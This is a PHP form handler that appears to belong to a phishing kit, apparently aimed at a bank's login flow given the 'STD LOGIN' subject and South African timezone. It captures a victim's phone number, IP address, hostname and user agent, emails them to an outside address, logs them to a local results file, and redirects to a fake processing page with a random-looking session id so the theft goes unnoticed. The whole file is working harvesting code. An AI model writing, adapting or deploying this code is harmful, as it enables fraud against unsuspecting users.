<?php
if($_POST["phone"] != "" and $_POST["phone"] != ""){
date_default_timezone_set("Africa/Johannesburg");
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$phone = $_POST['phone'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                          
                            <tr>
                                <td style="font-weight: bold">Phone Number:</td>
                                <td style="padding-left: 1em;">'.$_POST['phone'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|-----------Don Money-------------|\n";

   $from = "2nd Result <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "STD LOGIN [$phone] [$ip] [$date]";
        if(mail("info@pragmalaw.in",$subject,$message,$headers))
		$fp = fopen("myresults.txt","a");
fputs($fp,$message);
fclose($fp);	
		$praga=rand();
$praga=md5($praga);
  header ("Location: processing_1_luPSIxOSIgbWF4PSI.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
